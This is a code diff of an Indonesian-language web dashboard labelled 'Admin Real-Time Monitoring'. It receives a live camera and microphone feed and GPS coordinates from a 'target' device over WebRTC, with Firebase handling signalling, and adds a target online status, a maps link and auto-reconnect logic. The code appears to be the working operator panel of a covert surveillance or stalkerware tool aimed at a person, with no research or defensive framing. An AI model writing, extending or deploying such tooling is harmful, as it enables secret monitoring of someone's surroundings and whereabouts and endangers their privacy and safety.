@@ -2,33 +2,38 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>Panel Monitor Real-Time</title>
+    <title>Admin Real-Time Monitoring</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
-        body { background: #1a1a1a; color: white; font-family: sans-serif; padding: 20px; text-align: center; }
-        #videoBox { width: 100%; max-width: 640px; border: 3px solid #00ff00; background: #000; margin: 0 auto; }
-        video { width: 100%; }
-        .controls { margin-top: 20px; padding: 20px; background: #222; border-radius: 10px; }
-        button { padding: 15px 30px; font-size: 18px; font-weight: bold; cursor: pointer; border: none; border-radius: 5px; }
-        .btn-audio { background: #00ff00; color: #000; margin-bottom: 10px; }
-        .btn-reload { background: #ff3333; color: #fff; font-size: 14px; }
+        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; margin: 0; }
+        .dashboard { display: grid; grid-template-columns: 1fr 350px; gap: 20px; max-width: 1200px; margin: 0 auto; }
+        .video-wrapper { background: #111; border: 2px solid #00ff00; position: relative; border-radius: 10px; overflow: hidden; }
+        video { width: 100%; display: block; }
+        .panel { background: #111; padding: 20px; border: 1px solid #333; border-radius: 10px; }
+        .btn-audio { background: #00ff00; color: #000; border: none; padding: 15px; width: 100%; font-weight: bold; cursor: pointer; border-radius: 5px; margin-bottom: 15px; }
+        .status-on { color: #00ff00; }
+        .status-off { color: #ff0000; }
+        .log-box { font-size: 12px; color: #888; margin-top: 15px; height: 100px; overflow-y: auto; border-top: 1px solid #333; padding-top: 10px; }
     </style>
 </head>
 <body>
-    <h2>LIVE MONITORING: AUDIO & VIDEO</h2>
-    
-    <div id="videoBox">
-        <!-- Audio harus dimulai lewat interaksi user -->
-        <video id="rv" autoplay playsinline></video>
-    </div>
+    <div class="dashboard">
+        <div class="video-wrapper">
+            <video id="rv" autoplay playsinline></video>
+            <div style="position:absolute; top:10px; left:10px; background:rgba(0,0,0,0.7); padding:5px;">LIVE FEED</div>
+        </div>
 
-    <div class="controls">
-        <button id="audioBtn" class="btn-audio">🔊 AKTIFKAN SUARA & VIDEO</button>
-        <br>
-        <div id="locData">Menunggu lokasi...</div>
-        <br>
-        <button onclick="location.reload()" class="btn-reload">RESTART SISTEM</button>
+        <div class="panel">
+            <button id="audioBtn" class="btn-audio">KLIK UNTUK SUARA (Wajib)</button>
+            
+            <h3>STATUS TARGET</h3>
+            <p>Koneksi: <span id="conn-stat" class="status-off">OFFLINE</span></p>
+            <p>Lokasi: <span id="loc-data" style="color:white">-</span></p>
+            <button onclick="window.open(mapUrl, '_blank')" id="mapBtn" style="width:100%; padding:8px;" disabled>BUKA MAPS</button>
+            
+            <div class="log-box" id="logs">Sistem dimulai...</div>
+        </div>
     </div>
 
     <script>
@@ -38,44 +43,86 @@
             projectId: "chatroom-e9b3f"
         };
         firebase.initializeApp(firebaseConfig);
-        const db = firebase.database().ref('secure_p2p_v3');
+        const db = firebase.database().ref('auto_p2p_v4');
 
-        let pc = new RTCPeerConnection({
-            iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
-        });
+        let pc;
+        let mapUrl = "";
 
-        // Tombol aktivasi (PENTING untuk browser)
-        document.getElementById('audioBtn').onclick = function() {
-            document.getElementById('rv').play();
-            this.style.background = "#555";
-            this.innerText = "SISTEM AKTIF";
-        };
+        function addLog(msg) {
+            const div = document.getElementById('logs');
+            div.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
+            div.scrollTop = div.scrollHeight;
+        }
 
-        pc.ontrack = e => {
-            document.getElementById('rv').srcObject = e.streams[0];
-        };
+        async function createAnswer() {
+            if (pc) pc.close();
+            pc = new RTCPeerConnection({
+                iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
+            });
 
-        async function start() {
+            pc.ontrack = e => {
+                document.getElementById('rv').srcObject = e.streams[0];
+                addLog("Stream diterima.");
+            };
+
+            pc.onicecandidate = e => {
+                if (e.candidate) db.child('ice_monitor').push(e.candidate.toJSON());
+            };
+
+            // Ambil Offer
             db.child('sdp/offer').on('value', async s => {
                 const o = s.val();
-                if(o && !pc.currentRemoteDescription) {
+                if (o && pc && !pc.currentRemoteDescription) {
+                    addLog("Offer ditemukan, mengirim Answer...");
                     await pc.setRemoteDescription(new RTCSessionDescription(o));
                     const a = await pc.createAnswer();
                     await pc.setLocalDescription(a);
-                    db.child('sdp/answer').set({type: a.type, sdp: a.sdp});
+                    await db.child('sdp/answer').set({ type: a.type, sdp: a.sdp });
                 }
             });
 
-            pc.onicecandidate = e => { if(e.candidate) db.child('ice_m').push(e.candidate.toJSON()); };
-            db.child('ice_t').on('child_added', s => pc.addIceCandidate(new RTCIceCandidate(s.val())));
-
-            db.child('loc').on('value', s => {
-                const d = s.val();
-                if(d) document.getElementById('locData').innerHTML = `LOKASI: <a href="https://maps.google.com/?q=${d.lat},${d.lng}" target="_blank" style="color:#0f0">LIHAT DI MAPS</a>`;
+            // ICE Target
+            db.child('ice_target').on('child_added', s => {
+                if (pc) pc.addIceCandidate(new RTCIceCandidate(s.val()));
             });
         }
 
-        start();
+        // Monitoring Heartbeat
+        db.child('status').on('value', s => {
+            const val = s.val();
+            const statText = document.getElementById('conn-stat');
+            if (val && (Date.now() - val.lastActive < 10000)) {
+                statText.innerText = "ONLINE";
+                statText.className = "status-on";
+                document.getElementById('loc-data').innerText = `${val.lat.toFixed(4)}, ${val.lng.toFixed(4)}`;
+                mapUrl = `https://www.google.com/maps?q=${val.lat},${val.lng}`;
+                document.getElementById('mapBtn').disabled = false;
+            } else {
+                statText.innerText = "OFFLINE";
+                statText.className = "status-off";
+            }
+        });
+
+        // Deteksi jika Target melakukan refresh (Offer hilang lalu muncul lagi)
+        db.child('sdp/offer').on('value', s => {
+            if (s.exists()) {
+                addLog("Target terdeteksi aktif, menyambungkan...");
+                createAnswer();
+            } else {
+                addLog("Menunggu target...");
+            }
+        });
+
+        document.getElementById('audioBtn').onclick = function() {
+            document.getElementById('rv').muted = false;
+            document.getElementById('rv').play();
+            this.innerText = "AUDIO AKTIF";
+            this.style.background = "#333";
+            this.style.color = "#00ff00";
+        };
+
+        // Bersihkan answer saat monitor refresh agar target tahu kita baru saja refresh
+        window.onbeforeunload = () => { db.child('sdp/answer').remove(); };
     </script>
 </body>
 </html>
